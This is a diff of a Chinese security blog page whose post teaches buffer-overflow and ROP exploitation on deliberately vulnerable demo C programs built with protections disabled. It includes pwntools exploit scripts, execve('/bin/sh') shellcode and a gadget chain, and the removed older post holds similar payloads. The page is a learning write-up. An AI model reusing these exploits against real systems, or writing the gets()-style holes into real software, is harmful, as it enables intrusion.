@@ -3,26 +3,29 @@
 <head>
   <meta charset="utf-8">
   
-  <title>“爬坑之路--BIN(四)--7 | JXF</title>
+  <title>Pwn-1 | JXF</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="初学PWN…看他第一面我就知道自己和他没有太大的交集了…">
+  <meta name="description" content="Buffer Overflow 以及 ROP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“爬坑之路--BIN(四)--7">
-<meta property="og:url" content="http://yoursite.com/2018/07/08/爬坑之路--BIN(四)--7/index.html">
+<meta property="og:title" content="Pwn-1">
+<meta property="og:url" content="http://yoursite.com/2018/10/07/pwn-1/index.html">
 <meta property="og:site_name" content="JXF">
-<meta property="og:description" content="初学PWN…看他第一面我就知道自己和他没有太大的交集了…">
+<meta property="og:description" content="Buffer Overflow 以及 ROP">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.imgur.com/mhIsQG3.jpg">
-<meta property="og:image" content="https://i.imgur.com/AsxPm6n.png">
-<meta property="og:image" content="https://i.imgur.com/halLx08.png">
-<meta property="og:image" content="https://i.imgur.com/UxfFU4f.png">
-<meta property="og:image" content="https://i.imgur.com/lPVOiai.png">
-<meta property="og:image" content="https://i.imgur.com/ut8i9yD.png">
-<meta property="og:updated_time" content="2018-07-09T13:21:40.157Z">
+<meta property="og:image" content="https://i.imgur.com/oWAF0jV.png">
+<meta property="og:image" content="https://i.imgur.com/ROm6c9x.png">
+<meta property="og:image" content="https://i.imgur.com/0Ldqeub.png">
+<meta property="og:image" content="https://i.imgur.com/JUr4NRQ.png">
+<meta property="og:image" content="https://i.imgur.com/RUg6uLZ.png">
+<meta property="og:image" content="https://i.imgur.com/wdYhGuo.png">
+<meta property="og:image" content="https://i.imgur.com/p9FgQSF.png">
+<meta property="og:image" content="https://i.imgur.com/0VZIsWN.png">
+<meta property="og:image" content="https://i.imgur.com/9dbuBD3.png">
+<meta property="og:updated_time" content="2018-11-04T14:39:20.539Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="“爬坑之路--BIN(四)--7">
-<meta name="twitter:description" content="初学PWN…看他第一面我就知道自己和他没有太大的交集了…">
-<meta name="twitter:image" content="https://i.imgur.com/mhIsQG3.jpg">
+<meta name="twitter:title" content="Pwn-1">
+<meta name="twitter:description" content="Buffer Overflow 以及 ROP">
+<meta name="twitter:image" content="https://i.imgur.com/oWAF0jV.png">
   
     <link rel="alternative" href="/atom.xml" title="JXF" type="application/atom+xml">
   
@@ -236,11 +239,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-爬坑之路--BIN(四)--7" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwn-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/07/08/爬坑之路--BIN(四)--7/" class="article-date">
-      <time datetime="2018-07-08T14:25:10.000Z" itemprop="datePublished">2018-07-08</time>
+      <a href="/2018/10/07/pwn-1/" class="article-date">
+      <time datetime="2018-10-07T08:54:01.000Z" itemprop="datePublished">2018-10-07</time>
 </a>
     </div>
   
@@ -253,7 +256,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      “爬坑之路--BIN(四)--7
+      Pwn-1
     </h1>
   
 
@@ -270,60 +273,85 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>初学PWN…<br>看他第一面我就知道自己和他没有太大的交集了…<br><a id="more"></a></p>
-<h2 id="栈的结构"><a href="#栈的结构" class="headerlink" title="栈的结构"></a>栈的结构</h2><ul>
-<li>栈顶地址<br><img src="https://i.imgur.com/mhIsQG3.jpg" alt=""></li>
-<li>自身理解：首先入栈、出栈操作都是通过esp增加或者减少来改变的。便是假定ebp不动，入栈操作，esp减小，出栈操作，esp增加。当调用一个新的函数，首先将ebp函数入栈，然后ebp等于esp，便可以进行一段新的入栈操作。</li>
-<li>栈的守护天使—GS，也叫Stack Canary或Cookie</li>
+        <p><strong>Buffer Overflow</strong> 以及 <strong>ROP</strong></p>
+<a id="more"></a>
+<p>##<strong>保护机制</strong> </p>
+<h3 id="Data-Execution-Prevention"><a href="#Data-Execution-Prevention" class="headerlink" title="Data Execution Prevention"></a>Data Execution Prevention</h3><table><tr><td bgcolor="#FF7F24">DEP 可以跑的不可以写，可以写的不可以跑#D1EEEE</td></tr></table>
+
+<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><table><tr><td bgcolor="#FF7F24">DEP Address Space Layout Randomization（地址空间布局随机化），该技术在2005年的kernel2.6.12中被引入到Linux系统，它将进程的某些内存空间地址进行随机化来增大入侵者预测目的地址的难度，从而降低进程被成功入侵的风险。当前Linux、Windows等主流操作系统都已经采用该项技术。</td></tr></table>
+
+<h4 id="ASLR等级"><a href="#ASLR等级" class="headerlink" title="ASLR等级"></a>ASLR等级</h4><table><tr><td bgcolor="#FF7F24">0: 完全关闭ASLR </td></tr></table><br><table><tr><td bgcolor="#FF7F24">1: 保留的随机化。共享库、栈、mmap（）以及VDSO将被随机化。 </td></tr></table><br><table><tr><td bgcolor="#FF7F24">2：完全随机化，通过brk（）分配的内存空间也将被随机化 </td></tr></table>
+
+<p>PS：</p>
+<ul>
+<li>ASLR并不负责BSSBSS段、代码段（文本段）和数据段（DATA段）的随机化。</li>
+<li>堆栈空间被完全随机化。</li>
 </ul>
-<h2 id="汇编语言Call、Ret"><a href="#汇编语言Call、Ret" class="headerlink" title="汇编语言Call、Ret"></a>汇编语言Call、Ret</h2><ul>
-<li>Call可看做 Push retaddr + Jump</li>
-<li>Ret 可看做 Pop  retaddr + Jump</li>
+<hr>
+<h2 id="gcc编译"><a href="#gcc编译" class="headerlink" title="gcc编译"></a>gcc编译</h2><table><tr><td bgcolor="#FF7F24"><br><br>1. 无栈保护：-fno-stack-protector<br>2. 无DEP:  -z execstack<br>3. 生成静态: -static<br>4. 生成32(64)位： -m32(64)<br><br>例子： gcc demo1.c -o demo1 -fno-stack-protector -z execstack -static -m32<br>+  ROPgadget –binary Demo2 &gt; gadgets –depth 20 （默认深度10）<br></td></tr></table>
+
+<hr>
+<h2 id="demo1-–-overflow"><a href="#demo1-–-overflow" class="headerlink" title="demo1 – overflow"></a>demo1 – overflow</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void A()&#123;</span><br><span class="line">	setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">        srand(time(0)^getpid());</span><br><span class="line">        char buf[100];</span><br><span class="line">        int magic = rand();</span><br><span class="line">        gets(buf);</span><br><span class="line">        if(atoi(buf)==magic)&#123;</span><br><span class="line">                puts(&quot;OKay...&quot;);</span><br><span class="line">                system(&quot;sh&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>并没有开aslr 和其他保护</li>
+<li>并且可以overflow覆盖掉ret_address，直接跳转到puts语句</li>
+<li>puts地址可以利用objdump来查找</li>
 </ul>
-<h2 id="Linux-shell："><a href="#Linux-shell：" class="headerlink" title="Linux shell："></a>Linux shell：</h2><ul>
-<li>cd       打开</li>
-<li>ls       列出当前目录下所有文件</li>
-<li>chmod    改变文件使用权限</li>
-<li>pwd      显示当前坐在目录</li>
-<li>objdump  查看目标文件或者可执行的目标文件的构成</li>
-<li>gdb      使用gdb进行调试</li>
-<li>checksec 检测二进制的保护机制是否开启</li>
-<li>mkdir    创建文件夹</li>
+<p><img src="https://i.imgur.com/oWAF0jV.png" alt=""></p>
+<p><img src="https://i.imgur.com/ROm6c9x.png" alt=""></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./demo1&quot;)</span><br><span class="line">payload=&quot;A&quot;*116+p32(0x804861b)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul>
+<li>第一次自己是想要直接跳到puts@plt的位置，跳转成功但总是拿不到sh，后面发现可能是自己直接跳转过去并没有将运行好puts后要返回的地址压入栈所以失败</li>
+<li>第二次自己就打算直接跳转system@plt 但是不知道为什么失败</li>
+<li>第三次跳转到函数中call system(“sh”) 语句 失败</li>
+<li>第四次 跳转到函数中 call puts(“OKay…”) 然后执行下来才可行</li>
 </ul>
-<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><ul>
-<li>因为如果要调用一个函数首先将ebp入栈保存，然后栈帧平衡，ebp=esp。从而开辟新的空间。假设被调用函数中有一个可以输入不限制长度的数组，又因为该数组的首地址比ebp入栈地址低，当输入一定长度时便可以覆盖后面需要retn的地址从而控制应该返回目标函数。<h3 id="例题一："><a href="#例题一：" class="headerlink" title="例题一："></a>例题一：</h3></li>
-<li>环境：需要在unbuntu_Master 2 环境下运行<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Demo2-NO-DEP-–Return-Oriented-Programming"><a href="#Demo2-NO-DEP-–Return-Oriented-Programming" class="headerlink" title="Demo2(NO DEP) –Return Oriented Programming"></a>Demo2(NO DEP) –Return Oriented Programming</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void A()&#123;</span><br><span class="line">	char buf[100];</span><br><span class="line">	gets(buf);</span><br><span class="line">	puts(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	A();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>开启了ASLR，所以栈地址都为随机</li>
+<li>可以尝试buffer overflow 来再次调用gets函数并输入shellcode并同时返回shellcode地址并执行</li>
+<li>gets参数设定，第一个参数为要写入文本的地址，第二个参数为要返回的地址，但是是第二个参数先入栈，然后第一个参数再入栈。</li>
+</ul>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
+<li>利用寻找offset（利用pattc和patto）</li>
+<li>利用objdump寻找到gets_addr</li>
+</ul>
+<p><img src="https://i.imgur.com/0Ldqeub.png" alt=""></p>
+<ul>
+<li>因为BSS段地址不受ASLR影响，所以只要在BSS段找到可以写可以执行的地址即可（gdb中利用vmmap查看）<br><img src="https://i.imgur.com/JUr4NRQ.png" alt=""></li>
+<li>因为BSS段中可能储存某些数据，但是整个数据段又不会完全占用，所以我们只要在(数段段尾地址-0x100)的地址写入shellcode</li>
+</ul>
+<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><table><tr><td bgcolor="#FF7F24"> shellcode=\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80 </td></tr></table>
+
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./demo2&quot;)</span><br><span class="line">offset=112</span><br><span class="line">gets_addr=p32(0x8048300)</span><br><span class="line">ret_addr=p32(0x0804b000-0x100)</span><br><span class="line">write_addr=p32(0x0804b000-0x100)</span><br><span class="line">payload=&quot;A&quot;*offset</span><br><span class="line">		+gets_addr</span><br><span class="line">		+ret_addr	  # return address of gets()</span><br><span class="line">		+write_addr   # first arg</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Demo3-DEP-–ROP-Chain"><a href="#Demo3-DEP-–ROP-Chain" class="headerlink" title="Demo3(DEP) –ROP Chain"></a>Demo3(DEP) –ROP Chain</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">        srand(time(0)^getpid());</span><br><span class="line">        char buf[100];</span><br><span class="line">        int magic = rand();</span><br><span class="line">        gets(buf);</span><br><span class="line">        if(atoi(buf)==magic)&#123;</span><br><span class="line">                puts(&quot;OKay...&quot;);</span><br><span class="line">                puts(&quot;/bin/sh&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>因为程序开启了DEP，所以可以写的地方不可执行，可以执行的地方不可写</li>
+<li>只能利用gadget来拼凑自己想要的System Call</li>
+<li><p>用ROPgadget –binary 来寻找gadge</p>
+</li>
+<li><p>例寻找 pop eax</p>
 </li>
 </ul>
-<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p><img src="https://i.imgur.com/AsxPm6n.png" alt=""></p>
+<p><img src="https://i.imgur.com/RUg6uLZ.png" alt=""></p>
 <ul>
-<li>我们通过程序报错可知retn的地址就保存在ox41384141中，然后利用patto函数可以知道它是在第112个字节</li>
+<li>当程序中没有/bin/sh 需要自己写到bss段 然后跳过去</li>
 </ul>
-<p><img src="https://i.imgur.com/halLx08.png" alt=""></p>
-<ul>
-<li><p>查看程序文件的构成并保存至dump目录</p>
+<h3 id="System-Call"><a href="#System-Call" class="headerlink" title="System Call"></a>System Call</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax=11 (execve)</span><br><span class="line">ebx=&quot;/bin/sh&quot;</span><br><span class="line">ecx=0</span><br><span class="line">edx=0</span><br><span class="line">int 0x80 -execve(&quot;/bin/sh&quot;,0,0)</span><br></pre></td></tr></table></figure>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./demo3&quot;)</span><br><span class="line">offset=116</span><br><span class="line">p_bd_r=0x0806faf9</span><br><span class="line">p_ecx_r=0x080df1ad</span><br><span class="line">p_eax_r=0x0807cb3b</span><br><span class="line">sh=0x80bb870</span><br><span class="line">int_0x80=0x0806d736</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload=&quot;A&quot;*offset+p32(p_eax_r)+p32(11)+ p32(p_bd_r)+p32(sh)+p32(0)+p32(p_ecx_r)+p32(0)+p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ROPgadget-编译出错"><a href="#ROPgadget-编译出错" class="headerlink" title="ROPgadget 编译出错"></a>ROPgadget 编译出错</h3><ul>
+<li><p>发现导入部分文件失败，百度后发现是libcapstone.so未放入castone下<br><img src="https://i.imgur.com/wdYhGuo.png" alt=""></p>
 </li>
-<li><p>查看文件并找到函数<strong>cmd()</strong>的地址</p>
+<li><p>寻找libcapstone.so文件<br><img src="https://i.imgur.com/p9FgQSF.png" alt=""></p>
+</li>
+<li><p>利用 pip show castone 查询路径<br><img src="https://i.imgur.com/0VZIsWN.png" alt=""></p>
 </li>
 </ul>
-<p><img src="https://i.imgur.com/UxfFU4f.png" alt=""></p>
 <ul>
-<li>利用python写payload=”a”112+p32(0x0804846b)</li>
+<li>最后将libcapstone.so拷贝到capstone目录下即可<br><img src="https://i.imgur.com/9dbuBD3.png" alt=""></li>
 </ul>
-<p><img src="https://i.imgur.com/lPVOiai.png" alt=""></p>
-<h4 id="利用Ret-slide"><a href="#利用Ret-slide" class="headerlink" title="利用Ret_slide"></a>利用Ret_slide</h4><p>(抄袭qff，有知道的大佬请详细告诉一下我)<br>在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置payload减少尝试次数。即RET前的字符串利用其他RET地址来填充。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"\x08\x04\x84\xa0"</span> * <span class="number">28</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<h3 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h3><h4 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	srand(time(<span class="number">0</span>) ^ getpid());</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> magic = rand();</span><br><span class="line"></span><br><span class="line">	gets(buf);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (atoi(buf) == magic) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Okay..."</span>);</span><br><span class="line"></span><br><span class="line">		system(<span class="string">"sh"</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	A();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul>
-<li>首先分析，如果当输入的字符串buf等于随机生成的magic那么便可以获得权限</li>
-<li>下面来看我们是否可以用栈溢出的方法来尝试。</li>
-<li>通过分析我们可知buf地址为[ebp-0x80],magic地址为[ebp-0x1c]。<br>因为buf的地址比magic地址低说明magic先入栈，然后buf入栈。而且他们两个之间相隔（0x80-0x1c)=100。又因为magic为指针型，所以占四个字节</li>
-<li>下面可以构造payload，因为要buf转换成整型与magic相同，便可以两者都为0，payload=”/x00”*104</li>
-</ul>
-<p><img src="https://i.imgur.com/ut8i9yD.png" alt=""></p>
-<ul>
-<li>同时不知道，如果将buf的值和magic的值都设置为1自己实现不了，<br>payload=”\x00”*99+”\x01”+”\x01\x00\x00\x00”</li>
-</ul>
-<p>未完待续……</p>
 
       
       
@@ -379,13 +407,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/07/08/爬坑之路--BIN(四)--7/">“爬坑之路--BIN(四)--7</a></p>
+        <p><span>本文标题:</span><a href="/2018/10/07/pwn-1/">Pwn-1</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Fake Student 的个人博客">Fake Student</a></p>
-        <p><span>发布时间:</span>2018年07月08日 - 22时25分</p>
-        <p><span>最后更新:</span>2018年07月09日 - 21时21分</p>
+        <p><span>发布时间:</span>2018年10月07日 - 16时54分</p>
+        <p><span>最后更新:</span>2018年11月04日 - 22时39分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/07/08/爬坑之路--BIN(四)--7/" title="“爬坑之路--BIN(四)--7">http://yoursite.com/2018/07/08/爬坑之路--BIN(四)--7/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/07/08/爬坑之路--BIN(四)--7/　　作者: Fake Student" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/10/07/pwn-1/" title="Pwn-1">http://yoursite.com/2018/10/07/pwn-1/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/07/pwn-1/　　作者: Fake Student" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -398,18 +426,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2018/07/09/爬坑之路--BIN(五)--9/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/10/30/linux-远程连接/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          爬坑之路--BIN(五)--9
+          linux 远程连接
         
       </div>
     </a>
   
   
-    <a href="/2018/07/07/爬坑之路--WEB(四)--6/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">爬坑之路--WEB(四)--6</div>
+    <a href="/2018/09/19/believeme/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">believeme</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -420,7 +448,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈的结构"><span class="toc-number">1.</span> <span class="toc-text">栈的结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#汇编语言Call、Ret"><span class="toc-number">2.</span> <span class="toc-text">汇编语言Call、Ret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-shell："><span class="toc-number">3.</span> <span class="toc-text">Linux shell：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-number">4.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#例题一："><span class="toc-number">4.1.</span> <span class="toc-text">例题一：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源代码"><span class="toc-number">4.1.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解题步骤"><span class="toc-number">4.1.2.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用Ret-slide"><span class="toc-number">4.1.3.</span> <span class="toc-text">利用Ret_slide</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题二"><span class="toc-number">4.2.</span> <span class="toc-text">例题二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源代码-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解题步骤-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">解题步骤</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-Execution-Prevention"><span class="toc-number">1.</span> <span class="toc-text">Data Execution Prevention</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASLR"><span class="toc-number">2.</span> <span class="toc-text">ASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ASLR等级"><span class="toc-number">2.1.</span> <span class="toc-text">ASLR等级</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gcc编译"><span class="toc-number"></span> <span class="toc-text">gcc编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo1-–-overflow"><span class="toc-number"></span> <span class="toc-text">demo1 – overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码"><span class="toc-number">1.</span> <span 